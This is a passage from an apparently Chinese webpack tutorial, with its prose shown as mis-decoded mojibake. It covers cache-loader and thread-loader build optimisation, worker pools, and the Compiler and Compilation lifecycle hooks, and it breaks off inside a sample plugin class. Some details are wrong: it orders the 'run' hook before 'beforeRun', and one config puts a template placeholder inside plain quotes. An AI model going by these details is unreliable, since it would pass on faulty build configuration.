æ€§èƒ½ä¼˜åŒ–ï¼šLoaderç¼“å­˜ã€å¤šè¿›ç¨‹ç¼–è¯‘ï¼ˆ<code>thread-loader</code>ï¼‰</h3><p><strong>Loader æ€§èƒ½ç“¶é¢ˆåˆ†æ</strong></p><p>å¸¸è§æ€§èƒ½é—®é¢˜ï¼š</p><table><thead><tr><th align="left">é—®é¢˜ç±»å‹</th><th align="left">è¡¨ç°ç‰¹å¾</th><th align="left">å½±å“ç¨‹åº¦</th></tr></thead><tbody><tr><td align="left">CPUå¯†é›†å‹Loader</td><td align="left">Babel&#x2F;TypeScriptç¼–è¯‘æ…¢</td><td align="left">é«˜</td></tr><tr><td align="left">IOå¯†é›†å‹Loader</td><td align="left">æ–‡ä»¶è¯»å–&#x2F;ç½‘ç»œè¯·æ±‚</td><td align="left">ä¸­</td></tr><tr><td align="left">é‡å¤è®¡ç®—</td><td align="left">ç›¸åŒæ–‡ä»¶åå¤å¤„ç†</td><td align="left">é«˜</td></tr><tr><td align="left">å•çº¿ç¨‹é˜»å¡</td><td align="left">æ— æ³•åˆ©ç”¨å¤šæ ¸CPU</td><td align="left">æé«˜</td></tr></tbody></table><p>æ€§èƒ½å½±å“é‡åŒ–ï¼š</p><pre class="mermaid">graph LR  A[æ„å»ºæ—¶é—´] --> B[Loaderå¤„ç†]  B --> C[CPUå¯†é›†å‹ 60%]  B --> D[IOæ“ä½œ 30%]  B --> E[å…¶ä»– 10%]</pre><p><strong>Loader ç¼“å­˜ä¼˜åŒ–æ–¹æ¡ˆ</strong></p><p>(1) cache-loader å·¥ä½œåŸç†</p><pre class="mermaid">graph TB  A[æºæ–‡ä»¶] --> B[cache-loader]  B --> C{ç¼“å­˜æ˜¯å¦å­˜åœ¨?}  C -->|æ˜¯| D[è¯»å–ç¼“å­˜ç»“æœ]  C -->|å¦| E[æ‰§è¡Œåç»­Loader]  E --> F[ä¿å­˜ç»“æœåˆ°ç¼“å­˜]  F --> G[è¿”å›å¤„ç†ç»“æœ]</pre><p>(2) é…ç½®ç¤ºä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          &#123;<br>            <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;cache-loader&#x27;</span>,<br>            <span class="hljs-attr">options</span>: &#123;<br>              <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-string">&#x27;./.cache/loader&#x27;</span>, <span class="hljs-comment">// ç¼“å­˜è·¯å¾„</span><br>              <span class="hljs-attr">cacheIdentifier</span>: <span class="hljs-string">&#x27;v1&#x27;</span>, <span class="hljs-comment">// ç¼“å­˜ç‰ˆæœ¬æ ‡è¯†</span><br>            &#125;<br>          &#125;,<br>          <span class="hljs-string">&#x27;babel-loader&#x27;</span><br>        ]<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          <span class="hljs-string">&#x27;style-loader&#x27;</span>,<br>          <span class="hljs-string">&#x27;cache-loader&#x27;</span>,<br>          <span class="hljs-string">&#x27;css-loader&#x27;</span>,<br>          <span class="hljs-string">&#x27;postcss-loader&#x27;</span><br>        ]<br>      &#125;<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(3) ç¼“å­˜ç­–ç•¥å¯¹æ¯”</p><table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">cache-loader</td><td align="left">é€šç”¨Loader</td><td align="left">é…ç½®ç®€å•</td><td align="left">é¢å¤–I&#x2F;Oå¼€é”€</td></tr><tr><td align="left">babel-loaderç¼“å­˜</td><td align="left">Babelä¸“ç”¨</td><td align="left">é›¶é…ç½®</td><td align="left">ä»…é€‚ç”¨Babel</td></tr><tr><td align="left">è‡ªå®šä¹‰æ–‡ä»¶ç¼“å­˜</td><td align="left">ç‰¹æ®Šéœ€æ±‚</td><td align="left">çµæ´»æ§åˆ¶</td><td align="left">å¼€å‘æˆæœ¬é«˜</td></tr></tbody></table><p><strong>å¤šè¿›ç¨‹ç¼–è¯‘ï¼šthread-loader</strong></p><p>æ¶æ„åŸç†ï¼š</p><pre class="mermaid">graph LR  A[ä¸»è¿›ç¨‹] --> B[åˆ›å»ºWorkeræ± ]  B --> C[Worker 1]  B --> D[Worker 2]  B --> E[Worker 3]  C --> F[å¤„ç†æ–‡ä»¶1]  D --> G[å¤„ç†æ–‡ä»¶2]  E --> H[å¤„ç†æ–‡ä»¶3]</pre><p>å®Œæ•´é…ç½®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          &#123;<br>            <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>,<br>            <span class="hljs-attr">options</span>: &#123;<br>              <span class="hljs-attr">workers</span>: <span class="hljs-number">4</span>, <span class="hljs-comment">// CPUæ ¸å¿ƒæ•°-1</span><br>              <span class="hljs-attr">workerParallelJobs</span>: <span class="hljs-number">50</span>,<br>              <span class="hljs-attr">poolTimeout</span>: <span class="hljs-number">2000</span>,<br>              <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;js-pool&#x27;</span><br>            &#125;<br>          &#125;,<br>          <span class="hljs-string">&#x27;babel-loader&#x27;</span><br>        ]<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          <span class="hljs-string">&#x27;style-loader&#x27;</span>,<br>          &#123;<br>            <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>,<br>            <span class="hljs-attr">options</span>: &#123;<br>              <span class="hljs-attr">workers</span>: <span class="hljs-number">2</span>,<br>              <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;css-pool&#x27;</span><br>            &#125;<br>          &#125;,<br>          <span class="hljs-string">&#x27;css-loader&#x27;</span>,<br>          <span class="hljs-string">&#x27;postcss-loader&#x27;</span><br>        ]<br>      &#125;<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–ç»„åˆæ‹³ï¼šç¼“å­˜ + å¤šè¿›ç¨‹æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æœ€ä½³å®è·µé…ç½®</span><br><span class="hljs-attr">use</span>: [<br>  <span class="hljs-string">&#x27;cache-loader&#x27;</span>,<br>  &#123;<br>    <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>,<br>    <span class="hljs-attr">options</span>: &#123;<br>      <span class="hljs-attr">workers</span>: <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span> - <span class="hljs-number">1</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&#x27;babel-loader&#x27;</span><br>]<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) Worker æ± å…±äº«</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// shared-pool.js</span><br><span class="hljs-keyword">const</span> threadLoader = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;thread-loader&#x27;</span>);<br><br><span class="hljs-comment">// é¢„çƒ­çº¿ç¨‹æ± </span><br>threadLoader.<span class="hljs-title function_">warmup</span>(<br>  &#123;<br>    <span class="hljs-attr">workers</span>: <span class="hljs-number">4</span>,<br>    <span class="hljs-attr">poolTimeout</span>: <span class="hljs-title class_">Infinity</span><br>  &#125;,<br>  [<span class="hljs-string">&#x27;babel-loader&#x27;</span>, <span class="hljs-string">&#x27;@babel/preset-env&#x27;</span>]<br>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">pool</span>: &#123;<br>    <span class="hljs-attr">workers</span>: <span class="hljs-number">4</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> &#123; pool &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./shared-pool&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>,<br>        <span class="hljs-attr">use</span>: [<br>          &#123; <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>, <span class="hljs-attr">options</span>: pool &#125;,<br>          <span class="hljs-string">&#x27;babel-loader&#x27;</span><br>        ]<br>      &#125;<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) æ™ºèƒ½ä»»åŠ¡åˆ†é…</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®æ–‡ä»¶å¤§å°é€‰æ‹©æ–¹æ¡ˆ</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source</span>) &#123;<br>  <span class="hljs-keyword">const</span> fileSize = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">byteLength</span>(source);<br>  <br>  <span class="hljs-comment">// å°æ–‡ä»¶ç›´æ¥å¤„ç†</span><br>  <span class="hljs-keyword">if</span> (fileSize &lt; <span class="hljs-number">1024</span> * <span class="hljs-number">10</span>) &#123; <span class="hljs-comment">// &lt; 10KB</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">processSmallFile</span>(source);<br>  &#125;<br>  <br>  <span class="hljs-comment">// å¤§æ–‡ä»¶ä½¿ç”¨Workerçº¿ç¨‹</span><br>  <span class="hljs-keyword">const</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>();<br>  workerPool.<span class="hljs-title function_">run</span>(&#123; source &#125;, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">callback</span>(err, result);<br>  &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ç›‘æ§ä¸è°ƒä¼˜</strong></p><p>(1) æ„å»ºåˆ†æå·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. å®‰è£…é€Ÿåº¦åˆ†ææ’ä»¶</span><br>npm install --save-dev speed-measure-webpack-plugin<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 2. é…ç½®ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SpeedMeasurePlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;speed-measure-webpack-plugin&#x27;</span>);<br><span class="hljs-keyword">const</span> smp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpeedMeasurePlugin</span>();<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = smp.<span class="hljs-title function_">wrap</span>(&#123;<br>  <span class="hljs-comment">// webpacké…ç½®</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) ä¼˜åŒ–å†³ç­–æ ‘</p><pre class="mermaid">graph TD  A[æ„å»ºé€Ÿåº¦æ…¢?] --> B{ä¸»è¦ç“¶é¢ˆç±»å‹}  B --> C[CPUå¯†é›†å‹] --> D[æ·»åŠ thread-loader]  B --> E[IOå¯†é›†å‹] --> F[æ·»åŠ cache-loader]  B --> G[é‡å¤è®¡ç®—] --> H[å¯ç”¨æŒä¹…åŒ–ç¼“å­˜]    D --> I[Workeræ•°é‡=CPUæ ¸å¿ƒæ•°-1]  F --> J[ç¼“å­˜ç›®å½•åˆ†ç¦»]  H --> K[Webpack5æŒä¹…åŒ–ç¼“å­˜]</pre><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) ç¼“å­˜å¤±æ•ˆ</p><p>ç—‡çŠ¶ï¼šä¿®æ”¹æ–‡ä»¶åæœªæ›´æ–°</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// cache-loaderé…ç½®</span><br>&#123;<br>  <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;cache-loader&#x27;</span>,<br>  <span class="hljs-attr">options</span>: &#123;<br>    <span class="hljs-attr">cacheIdentifier</span>: <span class="hljs-string">`v2-<span class="hljs-subst">$&#123;process.env.NODE_ENV&#125;</span>`</span>, <span class="hljs-comment">// æ·»åŠ ç¯å¢ƒå˜é‡</span><br>    <span class="hljs-attr">cacheDirectory</span>: <span class="hljs-string">&#x27;./.cache/$&#123;projectName&#125;&#x27;</span> <span class="hljs-comment">// é¡¹ç›®éš”ç¦»</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) Workerå†…å­˜æ³„æ¼</p><p>è¯Šæ–­ï¼šæ„å»ºåè¿›ç¨‹æœªé€€å‡º</p><p>è§£å†³ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>,<br>  <span class="hljs-attr">options</span>: &#123;<br>    <span class="hljs-attr">poolTimeout</span>: <span class="hljs-number">2000</span> <span class="hljs-comment">// è¶…æ—¶è‡ªåŠ¨å…³é—­</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-Pluginç³»ç»Ÿ"><a href="#2-2-Pluginç³»ç»Ÿ" class="headerlink" title="2.2 Pluginç³»ç»Ÿ"></a>2.2 Pluginç³»ç»Ÿ</h2><p>webpackæ’ä»¶æ˜¯ä¸€ä¸ªå…·æœ‰ apply æ–¹æ³•çš„ JavaScript ç±»ã€‚apply æ–¹æ³•ä¼šè¢« webpack compiler è°ƒç”¨ï¼Œå¹¶ä¸”åœ¨ æ•´ä¸ª ç¼–è¯‘ç”Ÿå‘½å‘¨æœŸéƒ½å¯ä»¥è®¿é—® compiler å¯¹è±¡ï¼Œæ’ä»¶ç›®çš„åœ¨äºè§£å†³ loader æ— æ³•å®ç°çš„å…¶ä»–äº‹ï¼ŒåŒ…æ‹¬ï¼šæ‰“åŒ…ä¼˜åŒ–ï¼Œèµ„æºç®¡ç†ï¼Œæ³¨å…¥ç¯å¢ƒå˜é‡ã€‚</p><h3 id="2-2-1-Compilerä¸Compilationå¯¹è±¡ç”Ÿå‘½å‘¨æœŸ"><a href="#2-2-1-Compilerä¸Compilationå¯¹è±¡ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="2.2.1 Compilerä¸Compilationå¯¹è±¡ç”Ÿå‘½å‘¨æœŸ"></a>2.2.1 Compilerä¸Compilationå¯¹è±¡ç”Ÿå‘½å‘¨æœŸ</h3><p><strong>æ ¸å¿ƒå¯¹è±¡å…³ç³»å›¾è°±</strong></p><pre class="mermaid">graph TD  A[Compiler] -->|åˆ›å»º| B[Compilation]  B -->|æ¨¡å—å¤„ç†| C[Module]  C -->|ä¾èµ–è§£æ| D[Dependency]  B -->|èµ„æºç”Ÿæˆ| E[Chunk]  E -->|è¾“å‡º| F[Asset]    subgraph ç”Ÿå‘½å‘¨æœŸæµç¨‹    G[åˆå§‹åŒ–] --> H[ç¼–è¯‘]    H --> I[ä¼˜åŒ–]    I --> J[è¾“å‡º]  end</pre><p><strong>Compilerå¯¹è±¡æ·±åº¦è§£æ</strong></p><p>Compileræ ¸å¿ƒèŒè´£ï¼š</p><ul><li>Webpackç¯å¢ƒçš„æ€»æ§åˆ¶å™¨</li><li>ç»´æŠ¤å®Œæ•´çš„é…ç½®ä¿¡æ¯</li><li>å¯åŠ¨å’Œåœæ­¢æ„å»ºè¿‡ç¨‹</li><li>ç›‘å¬æ–‡ä»¶ç³»ç»Ÿå˜åŒ–</li></ul><p>Compilerç”Ÿå‘½å‘¨æœŸé’©å­ï¼š</p><table><thead><tr><th align="left">é’©å­åç§°</th><th align="left">è§¦å‘æ—¶æœº</th><th align="left">ç±»å‹</th><th align="left">å…¸å‹åº”ç”¨</th></tr></thead><tbody><tr><td align="left">initialize</td><td align="left">åˆå§‹åŒ–æ—¶</td><td align="left">sync</td><td align="left">æ’ä»¶åˆå§‹åŒ–</td></tr><tr><td align="left">run</td><td align="left">å¼€å§‹æ„å»ºå‰</td><td align="left">async</td><td align="left">ç¯å¢ƒå‡†å¤‡</td></tr><tr><td align="left">watchRun</td><td align="left">ç›‘å¬æ¨¡å¼å¯åŠ¨</td><td align="left">async</td><td align="left">å¼€å‘æœåŠ¡å™¨</td></tr><tr><td align="left">beforeRun</td><td align="left">å®é™…æ„å»ºå‰</td><td align="left">async</td><td align="left">æ¸…ç†æ“ä½œ</td></tr><tr><td align="left">compile</td><td align="left">åˆ›å»ºCompilationå‰</td><td align="left">sync</td><td align="left">ä¿®æ”¹ç¼–è¯‘å‚æ•°</td></tr><tr><td align="left">make</td><td align="left">ç¼–è¯‘é˜¶æ®µå¼€å§‹</td><td align="left">parallel</td><td align="left">æ·»åŠ entry</td></tr><tr><td align="left">emit</td><td align="left">ç”Ÿæˆèµ„æºå‰</td><td align="left">async</td><td align="left">ä¿®æ”¹è¾“å‡ºæ–‡ä»¶</td></tr><tr><td align="left">afterEmit</td><td align="left">èµ„æºè¾“å‡ºå</td><td align="left">async</td><td align="left">æ¸…ç†ä¸´æ—¶æ–‡ä»¶</td></tr><tr><td align="left">done</td><td align="left">æ„å»ºå®Œæˆ</td><td align="left">async</td><td align="left">è¾“å‡ºç»Ÿè®¡ä¿¡æ¯</td></tr><tr><td align="left">failed</td><td align="left">æ„å»ºå¤±è´¥</td><td align="left">sync</td><td align="left">é”™è¯¯å¤„ç†</td></tr></tbody></table><p><strong>Compilationå¯¹è±¡æ·±åº¦è§£æ</strong></p><p>Compilationæ ¸å¿ƒèŒè´£ï¼š</p><ul><li>å•æ¬¡æ„å»ºè¿‡ç¨‹çš„æ§åˆ¶å™¨</li><li>ç»´æŠ¤æ¨¡å—ä¾èµ–å›¾</li><li>ä¼˜åŒ–chunksç»“æ„</li><li>ç”Ÿæˆæœ€ç»ˆèµ„æºæ–‡ä»¶</li></ul><p>Compilationç”Ÿå‘½å‘¨æœŸé’©å­ï¼š</p><table><thead><tr><th align="left">é’©å­åç§°</th><th align="left">è§¦å‘æ—¶æœº</th><th align="left">ç±»å‹</th><th align="left">å…¸å‹åº”ç”¨</th></tr></thead><tbody><tr><td align="left">buildModule</td><td align="left">æ¨¡å—æ„å»ºå‰</td><td align="left">sync</td><td align="left">ä¿®æ”¹æ¨¡å—æºç </td></tr><tr><td align="left">succeedModule</td><td align="left">æ¨¡å—æ„å»ºæˆåŠŸ</td><td align="left">sync</td><td align="left">æ¨¡å—åˆ†æ</td></tr><tr><td align="left">finishModules</td><td align="left">æ‰€æœ‰æ¨¡å—å®Œæˆ</td><td align="left">sync</td><td align="left">ä¾èµ–åˆ†æ</td></tr><tr><td align="left">seal</td><td align="left">å¼€å§‹å°è£…chunks</td><td align="left">sync</td><td align="left">ä¿®æ”¹chunkåˆ†ç»„</td></tr><tr><td align="left">optimizeDependencies</td><td align="left">ä¼˜åŒ–ä¾èµ–</td><td align="left">sync</td><td align="left">åˆ é™¤æœªä½¿ç”¨æ¨¡å—</td></tr><tr><td align="left">optimize</td><td align="left">ä¼˜åŒ–é˜¶æ®µå¼€å§‹</td><td align="left">sync</td><td align="left">è‡ªå®šä¹‰ä¼˜åŒ–</td></tr><tr><td align="left">optimizeModules</td><td align="left">ä¼˜åŒ–æ¨¡å—</td><td align="left">sync</td><td align="left">æ¨¡å—çº§ä¼˜åŒ–</td></tr><tr><td align="left">optimizeChunks</td><td align="left">ä¼˜åŒ–chunks</td><td align="left">sync</td><td align="left">æ‹†åˆ†&#x2F;åˆå¹¶chunk</td></tr><tr><td align="left">optimizeTree</td><td align="left">ä¼˜åŒ–ä¾èµ–æ ‘</td><td align="left">async</td><td align="left">é«˜çº§ä¼˜åŒ–</td></tr><tr><td align="left">optimizeChunkModules</td><td align="left">ä¼˜åŒ–chunkä¸­æ¨¡å—</td><td align="left">async</td><td align="left">æ¨¡å—çº§å‹ç¼©</td></tr><tr><td align="left">optimizeAssets</td><td align="left">ä¼˜åŒ–èµ„æº</td><td align="left">async</td><td align="left">èµ„æºå‹ç¼©</td></tr><tr><td align="left">processAssets</td><td align="left">å¤„ç†èµ„æº</td><td align="left">async</td><td align="left">èµ„æºä¿®æ”¹</td></tr></tbody></table><p><strong>å®Œæ•´ç”Ÿå‘½å‘¨æœŸæµç¨‹å›¾</strong></p><pre class="mermaid">sequenceDiagram  participant C as Compiler  participant Cp as Compilation  participant M as Module  participant D as Dependencies  C->>C: initialize  C->>C: run  C->>C: beforeRun  C->>C: compile  C->>Cp: åˆ›å»ºCompilation  Cp->>Cp: addEntry  Cp->>M: buildModule  M->>D: è§£æä¾èµ–  D->>M: é€’å½’æ·»åŠ æ–°æ¨¡å—  loop æ‰€æœ‰æ¨¡å—    Cp->>M: processModule  end  Cp->>Cp: finishModules  Cp->>Cp: seal  Cp->>Cp: optimizeDependencies  Cp->>Cp: createChunks  Cp->>Cp: optimizeChunks  Cp->>Cp: optimizeAssets  C->>C: emit  C->>C: afterEmit  Cp->>C: æŠ¥å‘Šç»Ÿè®¡ä¿¡æ¯  C->>C: done</pre><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>Compilerå’ŒCompilationçš„åŒºåˆ«ï¼Ÿ</p><ul><li>èŒè´£èŒƒå›´ï¼š<ul><li>Compilerï¼šå…¨å±€æ§åˆ¶å™¨ï¼Œè´Ÿè´£æ•´ä¸ªWebpackç¯å¢ƒçš„ç”Ÿå‘½å‘¨æœŸ</li><li>Compilationï¼šå•æ¬¡æ„å»ºè¿‡ç¨‹çš„æ§åˆ¶å™¨</li></ul></li><li>ç”Ÿå‘½å‘¨æœŸï¼š<ul><li>Compilerï¼šä»å¯åŠ¨åˆ°å…³é—­æŒç»­å­˜åœ¨</li><li>Compilationï¼šæ¯æ¬¡æ„å»ºæ—¶åˆ›å»ºï¼Œæ„å»ºç»“æŸåé”€æ¯</li></ul></li><li>æ•°æ®å­˜å‚¨ï¼š<ul><li>Compilerï¼šå­˜å‚¨å…¨å±€é…ç½®ã€æ’ä»¶çŠ¶æ€</li><li>Compilationï¼šå­˜å‚¨æ¨¡å—å›¾ã€chunksã€èµ„æº</li></ul></li></ul><h3 id="2-2-2-æ‰‹å†™Pluginï¼ˆèµ„æºæ³¨å…¥-æ„å»ºåˆ†ææ¡ˆä¾‹ï¼‰"><a href="#2-2-2-æ‰‹å†™Pluginï¼ˆèµ„æºæ³¨å…¥-æ„å»ºåˆ†ææ¡ˆä¾‹ï¼‰" class="headerlink" title="2.2.2 æ‰‹å†™Pluginï¼ˆèµ„æºæ³¨å…¥&#x2F;æ„å»ºåˆ†ææ¡ˆä¾‹ï¼‰"></a>2.2.2 æ‰‹å†™Pluginï¼ˆèµ„æºæ³¨å…¥&#x2F;æ„å»ºåˆ†ææ¡ˆä¾‹ï¼‰</h3><p><strong>Plugin æ ¸å¿ƒæœºåˆ¶</strong></p><p>æ’ä»¶åŸºæœ¬ç»“æ„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPlugin</span> &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-comment">// 1. æ³¨å†Œç”Ÿå‘½å‘¨æœŸé’©å­</span><br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">someHook</span>.<span class="hljs-title function_">tap</span>(<span class="hljs-string">&#x27;MyPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 2. å¤„ç†é€»è¾‘</span><br>    &#125;);<br>    <br>    <span class="hljs-comment">// 3. å¼‚æ­¥é’©å­å¤„ç†</span><br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;MyPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation, callback</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 4. æ“ä½œcompilation</span><br>      <span class="hljs-title function_">callback</span>(); <span class="hljs-comment">// å¿…é¡»è°ƒç”¨</span><br>    &#125;);<br>  